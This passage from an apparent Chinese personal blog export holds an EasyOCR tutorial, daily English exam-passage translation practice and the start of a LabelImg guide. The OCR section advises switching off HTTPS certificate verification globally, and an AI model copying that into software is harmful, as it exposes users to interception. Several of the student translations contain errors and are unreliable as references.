Successfully installed decorator-4.4.2 easyocr-1.4.1 networkx-2.5.1 opencv-python-headless-4.5.4.58 python-bidi-0.4.2 scikit-image-0.17.2 tifffile-2020.9.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="使用easyocr"><a href="#使用easyocr" class="headerlink" title="使用easyocr"></a>使用easyocr</h2><p>简单示例：<br><pre class="line-numbers language-none"><code class="language-none">import easyocr

reader &#x3D; easyocr.Reader([&#39;ch_sim&#39;, &#39;en&#39;], gpu&#x3D;True)  
result &#x3D; reader.readtext(r&quot;labelimg.jpg&quot;, detail&#x3D;0)
print(result)
# detail&#x3D;0 不输出位置信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="导入库"><a href="#导入库" class="headerlink" title="导入库"></a>导入库</h3><pre class="line-numbers language-none"><code class="language-none">import os
import easyocr
import cv2
from matplotlib import pyplot as plt
import numpy as np<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="读取图像"><a href="#读取图像" class="headerlink" title="读取图像"></a>读取图像</h3><p><img src="https://www.codekp.cn/download/img/ubuntu/NVIDIA1.png" alt=""></p>
<ul>
<li>URL图片<br><code>Image=&#39;https://www.codekp.cn/download/img/ubuntu/NVIDIA1.png&#39;</code></li>
<li>本地图片<br><code>Image=&#39;labelimg.jpg&#39;</code><br><code>result = reader.readtext(Image, detail=0,paragraph=&quot;False&quot;)</code><h4 id="图片如果是https，请附上"><a href="#图片如果是https，请附上" class="headerlink" title="图片如果是https，请附上"></a>图片如果是https，请附上</h4><pre class="line-numbers language-none"><code class="language-none"># 全局取消证书验证
import ssl
ssl._create_default_https_context &#x3D; ssl._create_unverified_context<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h4 id="识别结果"><a href="#识别结果" class="headerlink" title="识别结果"></a>识别结果</h4><pre class="line-numbers language-none"><code class="language-none">[&#39;手动搜索驱动程序 提供您的系统信息以搜索全部 GeForce 驱动程序。&#39;, &#39;产品类型: GeFOrE&#39;, &#39;产品系列: GeFOrcE RTX 30 Series [Notebooks]&#39;, &#39;产品: GeForce RTX 3060 Laptoo GPU&#39;, &#39;操怍系统: LinUx 04-Oit&#39;, &#39;语言&#39;, &#39;Chinese (Simolified]&#39;, &#39;下载类型&#39;, &#39;全部&#39;, &#39;Q开始搜索&#39;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>准确度极高</p>
<ul>
<li>其中调用时使用[‘ch_sim’, ‘en’]可以识别简体中文和英文</li>
<li>“paragraph”，这里它被设置为False**，这意味着现在easyOCR不会合并结果，即如果EasyOCR会遇到多个文本，它不会合并它们，而是将它们分开显示。</li>
</ul>
</blockquote>
<h2 id="单行文本结果绘制"><a href="#单行文本结果绘制" class="headerlink" title="单行文本结果绘制"></a>单行文本结果绘制</h2><pre class="line-numbers language-none"><code class="language-none">top_left &#x3D; tuple(result[0][0][0])
bottom_right &#x3D; tuple(result[0][0][2])
text &#x3D; result[0][1]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ol>
<li>我们正在尝试获取坐标以在我们必须执行检测的图像上绘制边界框和文本。</li>
<li>在top_left变量中，我们以元组访问的形式从结果中获取左上角的坐标。同样，我们可以获取右下角的坐标。</li>
<li>从二维数组格式获取文本的坐标<pre class="line-numbers language-none"><code class="language-none">img &#x3D; cv2.imread(Image2)
img &#x3D; cv2.rectangle(img,top_left,bottom_right,(0,255,0),3)
img &#x3D; cv2ImgAddText(img, text, bottom_right[0], bottom_right[1], (0, 255, 0), 10)
plt.figure(figsize&#x3D;(10,10))
plt.imshow(img)
plt.show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li>读取图片</li>
<li>画矩形框</li>
<li>图片输入中文英文字符</li>
<li>图片显示</li>
</ol>
<p>结果<br><img src="https://www.codekp.cn/download/img/ubuntu/NVIDIA3.png" alt=""></p>
<h2 id="处理多行文本的结果"><a href="#处理多行文本的结果" class="headerlink" title="处理多行文本的结果"></a>处理多行文本的结果</h2><pre class="line-numbers language-none"><code class="language-none">img &#x3D; cv2.imread(Image2)
spacer &#x3D; 100
for detection in result:
    top_left &#x3D; tuple(detection[0][0])
    bottom_right &#x3D; tuple(detection[0][2])
    text &#x3D; detection[1]
    img &#x3D; cv2.rectangle(img,top_left,bottom_right,(0,255,0),3)
    img &#x3D; cv2ImgAddText(img, text, bottom_right[0], bottom_right[1], (0, 255, 0), 18)
    spacer+&#x3D;15

plt.figure(figsize&#x3D;(10,10))
plt.imshow(img)
plt.show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>遍历所有检测，绘制多行文本</li>
</ul>
<p>结果：<br><img src="https://www.codekp.cn/download/img/ubuntu/NVIDIA4.png" alt=""></p>
<h3 id="中文绘制函数"><a href="#中文绘制函数" class="headerlink" title="中文绘制函数"></a>中文绘制函数</h3><pre class="line-numbers language-none"><code class="language-none">def cv2ImgAddText(img, text, left, top, textColor&#x3D;(0, 255, 0), textSize&#x3D;20):
    if (isinstance(img, np.ndarray)):  # 判断是否OpenCV图片类型
        img &#x3D; Image.fromarray(cv2.cvtColor(img, cv2.COLOR_BGR2RGB))
    draw &#x3D; ImageDraw.Draw(img)
    fontStyle &#x3D; ImageFont.truetype(
        &quot;simsun.ttc&quot;, textSize, encoding&#x3D;&quot;utf-8&quot;)
    draw.text((left, top), text, textColor, font&#x3D;fontStyle)
    return cv2.cvtColor(np.asarray(img), cv2.COLOR_RGB2BGR)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> 识别准确度较高，识别时延极低在10-20ms，适合进行应用。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>OCR</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>English_learning</title>
    <url>/2020/07/31/English-learning/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>本处选取于考研真题及专业八级英语真题进行学习，每日进行翻译一篇<br>  其中特殊句式采用不同颜色进行了标记</p>
</blockquote>
<!-- > 
<font face="黑体">我是黑体字</font>
<font face="微软雅黑">我是微软雅黑</font>
<font face="STCAIYUN">我是华文彩云</font>
<font color=red>我是红色</font>
<font color=#008000>我是绿色</font>
<font color=Blue>我是蓝色</font>
<font size=5>我是尺寸</font>
<font face="黑体" color=green size=5>我是黑体，绿色，尺寸为5</font> -->
<span id="more"></span>
<h1 id="第一篇"><a href="#第一篇" class="headerlink" title=" 第一篇 "></a><center> 第一篇 </center></h1><h3 id="2020-07-31"><a href="#2020-07-31" class="headerlink" title="2020_07_31"></a><p align="right">2020_07_31</p></h3><font face="黑体" color=black size=4>
&nbsp;&nbsp;It was 3:45 in the morning when the vote was finally taken. After six months of arguing and final 16 hours of hot parliamentary debates, Australia’s Northern Territory became the first legal authority in the world to allow doctors to take the lives of <font face="黑体" color=yellow size=4>incurably ill patients who wish to die.</font> The measure passed by the convincing vote of 15 to 10. Almost immediately word flashed on the Internet and was picked up, half a world away, <font face="黑体" color=red size=4>by John Hofsess, executive director of the Right to Die Society of Canada.</font> He sent it on by way of the group’s online service, Death NET. Says Hofsess: <font face="黑体" color=green size=4>“We posted bulletins all day long, because of course this isn’t just something that happened in Australia. It’s world history.”</font>

<p>&nbsp;&nbsp;直到凌晨3:45分的时候投票才最终被确定。经过四个小时的争论和最后16个小时的议会讨论，澳大利亚北方地区成为世界上第一个允许医生终结那些无法治愈疾病希望死亡人们的生命的合法当局。这个措施以一个令人信服的投票比15:10通过。几乎这个消息立刻被显示到了网上，被John Hofsess加拿大有权死亡协会执行性理事得知。他通过组织的网络服务器将这条信息发布到了死亡网上。John Hofsess说我们长时间的发布公告，因为当然这不仅仅是一些发生在澳大利亚的事情，这是世界的历史时刻。</p>
<p>&nbsp;&nbsp; The full import may take a while to sink in. The NT Rights of the Terminally Ill Law has left physicians and citizens alike trying to deal with its moral and practical implications. <font face="黑体" color=yellow size=4>Some have breathed sighs of relief, others, including churches, right-to-life groups and the Australian Medical Association, bitterly attacked the bill and the hurry of its passage.</font> But the tide is unlikely to turn back. In Australia—where an aging population, life-extending technology and changing community attitudes have all played their part—other states are going to consider making a similar law to deal with euthanasia (安乐死). In the US and Canada, where the right-to-die movement is gathering strength, observers are waiting for the dominoes (多米诺骨牌) to start falling.</p>
<p>&nbsp;&nbsp;完全的理解可能需要一定的时间。晚期病人澳大利亚北方当局权利法案已经让医生和市民试图去解决他的到的和实际的影响。一些人如释重负，其他人包括教堂，生命正确组织和澳大利亚医学会，强烈地抨击这项法案和这项法案的仓促通过。但是这种趋势已经无法扭转。在澳大利亚验证老龄化的地区，生命羊场技术和改变社区态度已经扮演好了他们的角色，其他州正在考虑实施一个相似度法律去解决安乐死。在美国和加拿大死亡有道运动正在增长能量，观察者正在等待着多米诺骨牌效应开始崩塌。</p>
<p>&nbsp;&nbsp;Under the new Northern Territory law, <font face="黑体" color=red size=4>an adult patient can request death — probably by a deadly injection or pill — to put an end to suffering. The patient must be diagnosed (诊断) as Terminally Ill by two doctors.</font> After a “cooling off” period of seven days, the patient can sign a certificate of request. After 48 hours the wish for death can be met. For Lloyd Nickson, a 54-year-old Darwin resident suffering from lung cancer, the NT Rights of Terminally Ill Law means he can get on with living without the haunting fear of his suffering: a terrifying death from his breathing condition. “I’m not afraid of dying from a spiritual point of view, but what I was afraid of was how I’d go, because I’ve watched people die in the hospital fighting for oxygen and clawing at their masks,” he says.</p>
<p>&nbsp;&nbsp;在新北方当局权利法案下，一个成年患者可以请求死亡，可能是通过注射或者药物去终结这种苦难。病人一定要同时被两名医生被诊断为晚期疾病。在一个星期的“冷静期”后，换这可以签署一份请求确认书。在48小时后死亡的愿望将被得以满足。对于Lloyd Nickson一个54岁 Darwin（达尔文市）市民正在遭受肺癌的苦难，澳大利亚北方当局晚期病人权利法案意味着他能够继续生活不用魂牵梦萦的恐惧这种苦难- -一个因为呼吸状况导致的可怕死亡。他说:“从心灵一个点去看，我并不害怕死亡，但是我十分担心我是怎么走的，因为我曾经看到人们死在医院里为了氧气而斗争用手抓他们的面具”</p>
<p>&lt;/font&gt;</p>
<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h1 id="第二篇"><a href="#第二篇" class="headerlink" title=" 第二篇 "></a><center> 第二篇 </center></h1><h3 id="2020-08-01"><a href="#2020-08-01" class="headerlink" title="2020_08_01"></a><p align="right">2020_08_01</p></h3><font face="黑体" color=black size=4>
&nbsp;&nbsp;Much of the language used to describe monetary policy, such as steering the economy to a soft landing or a touch on the brakes, makes itself sound like a precise science. Nothing could be further from the truth. <font face="黑体" color=red size=4>The link between interest rates and inflation is uncertain. And there are long, variable lags before policy changes have any effect on the economy. </font><font face="黑体" color=yellow size=4>Hence there is an analogy that likens the conduct of monetary policy to driving a car with a blackened windscreen, a cracked rearview mirror and a faulty steering wheel.</font>

<p>&nbsp;&nbsp;很多的语言被用来描述货币政策，例如引导经济软着陆、轻踩刹车，让这听起来像一个<br>清晰的科学，没有什么能够比真想离的更远了。在利率和通货膨胀率之间的关系是不确定的。因此货币政策的改变影响经济上有很长的随机的滞后。所以这里有一个类比说货币政策的实施就像开着一辆有破挡风玻璃、一个破裂的后视镜和一个有问题的方向盘的车。</p>
<p>&nbsp;&nbsp;Given all these disadvantages, central bankers seem to have had much to boast about of late. <font face="黑体" color=green size=4>Average inflation in the big seven industrial economies fell to a mere 2.3% last year, close to its lowest level in 30 years, before rising slightly to 2.5% this July.</font> This is a long way below the double-digit rates which many countries experienced in the 1970s and early 1980s.</p>
<p>&nbsp;&nbsp;考虑到这些不利条件，中央银行似乎有很多值得夸耀的地方。去年，七月在轻微的增长百分之2.5之前，七大工业国经济平均通货膨胀率下降到2.3，接近他们三十年时间里的最低点。这远低于许多国家在1970-1980年代初经历的两位数利率。</p>
<p>&nbsp;&nbsp;<font face="黑体" color=pink size=4>It is also less than most forecasters had predicted. In late 1994 the panel of economists which The Economist polls each month said that America’s inflation rate would average 3.5% in 1995. </font>In fact, it fell to 2.6% in August, and is expected to average only about 3% for the year as a whole. In Britain and Japan inflation is running half a percentage point below the rate predicted at the end of last year. This is no flash in the pan; over the past couple of years, inflation has been consistently lower than expected in Britain and America.</p>
<p>&nbsp;&nbsp; 这也低于大多数预测者的预测，在1994年年末经济学家每月进行调查的经济学家小组说，1995年美国的通货膨胀率平均为3.5.事实上，他在八月跌落到2.6，并且它整年的期望平均仅仅只有大约百分之3.5，在英国和日本通货膨胀利率点低于在去年年末预测值的0.5个百分点。这不是盘子里的一个闪光点，在过去的几年里，英国和美国的通货膨胀率持续低于它的预期值。</p>
<p>&nbsp;&nbsp;<font face="黑体" color=purple size=4>Economists have been particularly surprised by favourable inflation figures in Britain and the United States, since conventional measures suggest that both economies, and especially America’s, have little productive slack.</font> America’s capacity utilisation, for example, hit historically high levels earlier this year, and its jobless rate (5.6% in August) has fallen below most estimates of the natural rate of unemployment-the rate below which inflation has taken off on the past.</p>
<p>&nbsp;&nbsp;经济学家对英国和美国有利的通货膨胀数字感到特别惊讶，因为传统的措施建议说经济尤其是美国有很少的生产萧条。美国能源利用率，举个例子，在早几年的时候达到了历史的最高值，并且他的失业率降低到了大多数估计值（8月5.6%）跌落到了大多数自然失业率估计值，在过去如果失业率低于自然失业率通货膨胀将会起跳。</p>
<p>&nbsp;&nbsp;Why has inflation proved so mild? <font face="黑体" color=red size=4>The most thrilling explanation is, unfortunately, a little defective. Some economists argue that powerful structural changes in the world have upended the old economic models that were based upon the historical link between growth and inflation.</font></p>
<p>&nbsp;&nbsp;为什么通货膨胀率检测的如此温和？最令人兴奋的解释是不幸的是有一些缺陷。一些经济学家争辩说世界上强有力的结构性改变，颠倒了旧的经济形势基于关于增长和通货膨胀之间的历史联系。</p>
<p>&lt;/font&gt;</p>
<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h1 id="第三篇"><a href="#第三篇" class="headerlink" title=" 第三篇 "></a><center> 第三篇 </center></h1><h3 id="2020-08-03"><a href="#2020-08-03" class="headerlink" title="2020_08_03"></a><p align="right">2020_08_03</p></h3><font face="黑体" color=black size=4>

&nbsp;&nbsp;In the first year or so of Web business, most of the action has revolved around efforts to Lap the consumer market. More recently, as the Web proved to be more than a fashion. companies have started to buy and sell products and services with one another. Such business-to-business sales make sense because business people typically know what product they’re looking for.

&nbsp;&nbsp;大约在电子商务的第一年，大多数的行为都是围绕顾客市场的努力。最近，网站证明是不仅仅是时尚。公司开始相互的去购买、销售产品和服务。例如，公司对公司的销售因为"老板通常都知道他们需要的产品是什么？"而有意义。

&nbsp;&nbsp;Nonetheless, many companies still hesitate to use the Web because of doubts about its reliability. "Businesses need to feel they can trust the pathway between them and the supplier," says senior analyst Blane Erwin of Forrester Research. Some companies are limiting the risk by conducting online transactions only with established business partners who are given access to the company's private intranet.

&nbsp;&nbsp;虽然如此，很多的公司仍然犹豫去利用网络因为对他的可靠性表示怀疑。福雷斯特研究公司的高级分析师布兰·埃温说：“公司需要去感到他们能够想象他们和供货商之间的信任”。一些公司限制于风险，只和已经建立的且提供公司特殊网络通道的生意伙伴引导网络接口。

&nbsp;&nbsp;Another major shift in the model for Internet commerce concerns the technology available for marketing. Until recently, Internet marketing activities have focused on strategies to "pull" customers into sites. In the past year, however, software companies have developed tools chat allow companies to "push" information directly out to consumers, transmitting marketing messages directly to targeted customers, Most notably, the Pointcast Network uses a screen saver to deliver a continually updated stream of news and advertisements to subscribers' computer monitors. Subscribers can customize the information they want to receive and proceed directly to a company's Web site. Companies such as Virtual Vineyards are already starting to use similar technologies to push messages to customers about special sales, product offering, or other events.But push technology has earned the contempt of many Web users.<font face="黑体" color=yellow size=4> Online culture thinks highly of the notion that the information flowing onto the screen comes there by specific request. </font>  Once commercial promotion begins to fill the screen uninvited, the distinction between the Web and television fades. Thar's a prospect that horrifies Net purists.

&nbsp;&nbsp;互联网商业模式的另一个重大转变涉及可用于营销的技术。直到最近，互联网市场活动关注于直接拉顾客到网页中。在过去的几年里，虽然软件公司建立工具让公司交流去直接推送信息给顾客，直接向目标客服传递营销信息。订阅者可以自定义他们想要接收的信息，并直接进入公司网站。最值得注意的是，定点广播网站用一系列的节约装置去投递关于向订阅者的计算机广告，新闻和广告持续的更新数据。订阅者可以定制他们想要的信息和直接进入他们的公司网站。公司例如虚拟Vineyards已经准备好开始用一个相似的技术去推送关于特殊销售的信息给顾客。产品的提供和其他事件，但是推送技术已经遭到了很多网民的蔑视。网络文化将信息流入屏幕通过特殊的请求的概念看的很高。一旦商业的提升开始未经邀请的充满屏幕，网络和电视的边界将会逐渐消失。这是一个可怕的网络纯粹主义者的前景。 



&nbsp;&nbsp;But it is hardly inevitable that companies on the Web will need to resort to push strategies to make money, The examples of Virtual Vineyards, Amazon.com and other pioneers show that a Web site selling the right. kind of products with the right mix of interactivity, hospitality, and security will attract online customers, And the cost of computing power continues to free fall, which is a good sign for any enterprise setting up shop m silicon. People looking back 5 or 10 years from now may well wonder why so few companies took the online plunge.

&nbsp;&nbsp;但是这是十分困难的不可避免的说网络公司将需要去求助于直接推送获取利益，例如虚拟葡萄园、亚马逊和其他开发者表明了网站销售正确性。具有正确的交互性组合产品，医疗和安全将会吸引网络顾客，并且计算机成本消耗的持续降低，这对于任何一个商家建立自己的网络商店都是好的标志。人们从现在开始回顾过去的五到十年可能会怀疑为什么如此少的公司在网上投入。

</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h1 id="第四篇"><a href="#第四篇" class="headerlink" title=" 第四篇 "></a><center> 第四篇 </center></h1><h3 id="2020-08-04"><a href="#2020-08-04" class="headerlink" title="2020_08_04"></a><p align="right">2020_08_04</p></h3><font face="黑体" color=black size=4>
&nbsp;&nbsp;In the last half of the nineteenth century .<font face="黑体" color=pink size=4>"capital" and "labour" were enlarging and perfecting their rival organisations on modern lines. </font><font face="黑体" color=red size=4>Many an old firm was replaced by a limited liability company with a bureaucracy of salaried managers. </font> <font face="黑体" color=yellow size=4>The change met the technical requirements of the new age by engaging a large professional element and prevented the decline in efficiency that so commonly spoiled the fortunes of family firms in the second and third generation after the energetic founders. </font> It was moreover a step away from individual initiative, towards collectivism and municipal and state-owned business. The railway companies, though still private business managed for the benefit of shareholders, were very unlike old family business. <font face="黑体" color=green size=4>At the same time the great municipalities went into business to supply lighting, trams and other services to the taxpayers.</font> 

<p>&nbsp;&nbsp;在19世纪下半叶，资本和劳工都在以现代的方式扩充和完善他们的对立机构。很多老的公司（坚固）已经被具有领薪经理的行政系统有限责任公司所代替，这种变化符合技术对于新时代通过聘用大量专业群体去防止效率的下降因为通常在精力充沛的创始人后的第二代和第三代会毁掉家族企业的财富)的需求。并且这也是远离个人行动朝向集体主义和市营和国营企业迈出的第一步。铁路企业尽管仍然是为股东利益经营的特殊企业，却十分不像传统的家族企业。在同样的时间里大城市的市政府进也开始从事实业，提供照明、有轨电车和其他服务给纳税人。</p>
<p>&nbsp;&nbsp;<font face="黑体" color=red size=4>The growth of the limited liability company and municipal business had important consequences. Such large, impersonal manipulation of capital and industry greatly increased the numbers and importance of shareholders as a class,</font> an element in national life representing irresponsible wealth detached from the land and the duties of the landowners, and almost equally detached from the responsible management of business. All through the nineteenth century, America, Africa, India, Australia and parts of Europe were being developed by British capital, and British shareholders were thus enriched by the world’s movement towards industrialisation. <font face="黑体" color=yellow size=4>Towns like Bournemouth and Eastbourne sprang up to house large “comfortable” classes who had retired on their incomes, </font>and who had no relation to the rest of the community except that of drawing dividends and occasionally attending a shareholders’meeting to dictate their orders to the management. On the other hand “shareholding” meant leisure and freedom which were used by many of the later Victorians for the highest purpose of a great civilization.</p>
<p>&nbsp;&nbsp;有限责任公司的增长和市营企业都有很重要的影响。如此大的，非个人的资本和企业的操纵极大的增加了股东作为一个群体的重要性和数量。国民生活中的一个重要组成部分，代表了不负责任的财富从土地和土地所有者的责任中分开。全部通过十九世纪，美国，非洲，印度和澳大利亚和部分的欧洲正在通过英国的资本建立，并且英国股东相信通过世界工业化运动将会变的富有。像B和E两座城市迅速崛起，给大量那些通过收入退休和那些与群体没有关系除了领取股票利息和偶尔的参加股东会议向主管人员指定他们的命令，的“舒适”群体定居。在另一反面，股权意味着闲暇和自由，这也习惯于被很多维多利亚末期人民认为是伟大文明的最高目标。</p>
<p>&nbsp;&nbsp;<font face="黑体" color=pink size=4>The “shareholders” as such had no knowledge of the lives, thoughts or needs of the workmen employed by the company in which be held shares, and his influence on the relations of capital and labour was not good. </font>The paid manager acting for the company was in more direct relation with the men and their demands,<font face="黑体" color=green size=4>but even be had seldom that familiar personal knowledge of’ the workmen which the employer had often had under the more patriarchal system of the old family business now passing away. </font>Indeed the mere size of operations and the numbers of workmen involved rendered such personal relations impossible. Fortunately, however, the increasing power and organisation of the trade unions, at least in all skilled trades, enabled the workmen to meet on equal terms the managers of the companies who employed them. The cruel discipline of the strike and lockout taught the two parties to respect each other’s strength and understand the value of fair negotiation.</p>
<p>&nbsp;&nbsp;严格来说股东对于他们持有股票公司所雇佣的员工的生活，思想和需求没有任何了解，并且他们对资本和劳工之间的的影响并不好。雇佣经理代表公司是一种与雇员和他们决定更加直接的联系，但是尽管如此雇佣经理对工人很少有亲近的个人的了解，而在那些正遭到淘汰的旧式家族家长制企业中，雇主通常对工人的个人情况有非常亲近的了解。确实仅仅是经营规模和员工数量使提供成为这样的个人关系是不可能的。然而幸运的是日益增长的势力和工会组织。至少在技能行业赋予工人在一个平等位置和雇主公司经历进行会谈。罢工和关店残酷的教训教会双方去尊重彼此的能力和理解公平谈判的价值。</p>
<p>&lt;/font&gt;</p>
<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h1 id="第五篇"><a href="#第五篇" class="headerlink" title=" 第五篇 "></a><center> 第五篇 </center></h1><h3 id="2020-08-05"><a href="#2020-08-05" class="headerlink" title="2020_08_05"></a><p align="right">2020_08_05</p></h3><font face="黑体" color=black size=4>
&nbsp;&nbsp;If you intend using humor in your talk to make people smile, you must know how to identify shared experiences and problems. Your humor must be relevant to the audience and should help to show them that you are one of them or that you understand their situation and are in sympathy with their point of view. Depending on whom you are addressing, the problems will be different.       
If you are talking to a group of managers, you may refer to the disorganized methods of their secretaries; alternatively if you are addressing secretaries, you may want to comment on their disorganized bosses.

&nbsp;&nbsp;如果你想要在你的谈话中利用幽默让人们微笑，你一定知道如何去辨别分享经验和问题。你的幽默必须和听众有关，应该帮助向他们去表明说你是其中之一或者说你理解他们的处境并且对他们的观点表示同情。取决于你的地址，问题将会变的不一样。如果你谈话的是组织的管理者，你可能指的是他们秘书杂乱无章的地方，或者如果你跟秘书谈话，你可能想要去评价他们杂乱无章的老板。

&nbsp;&nbsp;Here is an example, which I heard at a nurses' convention, of a story which works well because the audience all shared the same view of doctors. A man arrives in heaven and is being shown around by St. Peter. He sees wonderful accommodations, beautiful gardens, sunny weather, and so on. Everyone is very peaceful, polite and friendly until, waiting in a line for lunch, the new arrival is suddenly pushed aside by a man in a black coat, who rushes to the head of the line, grabs his food and stomps over to a table by himself. "Who is that?" the new arrival asked St. Peter. "Oh, that's God." came the reply, "but sometimes he thinks he's a doctor."

&nbsp;&nbsp;这里是一个例子，我曾经在护士的谈话中听到，一个十分有用的故事因为听众都在分享关于医生的相同观点。有一个人到达天堂并且被StP带着四处逛逛。他看到完美的诊疗室，美丽的花园，阳关灿烂的天气等等。每个人都十分的祥和，有礼貌并且友善，直到在排队等待午饭的时候，一个穿着白色大衣的新到达者冲到队伍最前方突然推开他在一旁，抓住他的食物并且快速一个人跺着脚走到一张桌子旁。”那是谁？”新来的人问圣彼得。”“哦，那是上帝。”回答说，“但有时他认为自己是个医生。”

&nbsp;&nbsp;If you are part of the group which you are addressing, you will be in a position to know the experiences and problems which are common to all of you and it'll be appropriate for you to make a passing remark about the inedible canteen food or the chairman's notorious bad taste in ties. With other audiences you mustn't attempt to cut in with humor as they will resent an outsider making disparaging remarks about their canteen or their chairman. You will be on safer ground if you stick to scapegoats like the Post Office or the telephone system.

&nbsp;&nbsp;如果你是正在谈论组织的一份子，你将会在一个位置去知道所有你相同的经验和问题，并且这将会很适合你去做一个关于食堂难以下咽的食物通过的评价，或者领导臭名昭著对于领带的坏品味。伴随着其他的听众，你一定不要试图插入幽默当他们将要憎恨一个局外人对他们的食堂或他们的主席说贬义的话。你将会处于一个安全的组织如果你选择当一个像邮局和电话系统一样的替罪羊。




&nbsp;&nbsp;If you feel awkward being humorous, you must practice so that it becomes more natural. Include a few casual and apparently off-the-cuff(即兴的)remarks which you can deliver in a relaxed and unforced manner. Often it's the delivery which causes the audience to smile, so speak slowly and remember that a raised eyebrow or an unbelieving look may help to show that you are making a light-hearted remark.

&nbsp;&nbsp;如果你感觉明白了幽默，你一定要练习以便这将会变的自然。包括一些随意的，明显是即兴的评价，你可以用轻松和不受强迫的方式表达出来。通常是演讲让听众微笑。所以说慢点并且记住说扬起眉毛或是一个不相信的表情可能有助于表明你在说轻松愉快的话。

&nbsp;&nbsp;Look for the humor. It often comes from the unexpected. A twist on a familiar quote "If at first you don't succeed, give up" or a play on words or on a situation. Search for exaggeration and understatements. Look at your talk and pick out a few words or sentences which you can turn about and inject with humor.

&nbsp;&nbsp;寻找幽默，他总是来源于意想不到。一对双胞胎在一个熟悉的引语“如果在你第一次没有成功，放弃”，或者玩弄语言或情境。寻找夸张和轻描淡写。观察你的言论选取一些语言或者你可以再说一次并且注入幽默的句子。



</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>英语</tag>
        <tag>英语阅读</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>LabelImg_使用</title>
    <url>/2021/07/21/LabelImg-%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="LabelImg-使用"><a href="#LabelImg-使用" class="headerlink" title="LabelImg_使用"></a>LabelImg_使用</h1><p>LabelImg 是一个图形图像注释工具。</p>
<p>它是用 Python 编写的，并使用 Qt 作为其图形界面。</p>
<p>注释以 PASCAL VOC 格式保存为 XML 文件，ImageNet使用的格式。此外，它还支持 YOLO 和 CreateML 格式。</p>
<p><img src="https://www.codekp.cn/download/img/labelImg/labelimg.jpg" alt=""></p>
<p>参考地址 ： <a href="https://github.com/tzutalin/labelImg">https://github.com/tzutalin/labelImg</a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre class="line-numbers language-none"><code class="language-none">conda install pyqt&#x3D;5
conda install -c anaconda lxml
pyrcc5 -o libs&#x2F;resources.py resources.qrc
python labelImg.py
python labelImg.py [IMAGE_PATH] [PRE-DEFINED CLASS FILE]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>有基础的同学可以直接<br><pre class="line-numbers language-none"><code class="language-none">pip install labelimg <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li><code>JPEGImage 目录</code>：存储的是图片的名字</li>
<li><code>Annotation 目录</code>：用于存放标注图片的标签文件</li>
<li><code>class.txt 文件</code>：定义自己要标注的所有类别</li>
</ul>
<p>例如：我的<code>class.txt</code>中定义的类别如下：<br><pre class="line-numbers language-none"><code class="language-none">one
two
ct5
other<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
<ul>
<li><code>Open Dir</code>：待标注图片数据的路径文件夹，即选择JPEGImage文件夹</li>
<li><code>Change Save Dir</code>：保存类别标签的路径文件夹，即选择Annotation文件夹</li>
<li><code>PascalVOC</code>：标注的标签保存成VOC格式，在鼠标点一下就变成YOLO，即此时就会把标注的标签变成YOLO格式</li>
</ul>
<h3 id="view-快捷指令"><a href="#view-快捷指令" class="headerlink" title="view 快捷指令"></a>view 快捷指令</h3><ul>
<li><code>Auto Save mode</code>：当你切换到下一张图片时，就会自动把上一张标注的图片标签自动保存下来，这样就不用每标注一样图片都按Ctrl+S保存一下了</li>
<li><code>Display Labels</code>：标注好图片之后，会把框和标签都显示出来</li>
<li><code>Advanced Mode</code>：这样标注的十字架就会一直悬浮在窗口，不用每次标完一个目标，再按一次W快捷键，调出标注的十字架。</li>
</ul>
<h3 id="标注常用的快捷键"><a href="#标注常用的快捷键" class="headerlink" title="标注常用的快捷键"></a>标注常用的快捷键</h3><ul>
<li><code>W</code>：调出标注的十字架，开始标注</li>
<li><code>A</code>：切换到上一张图片</li>
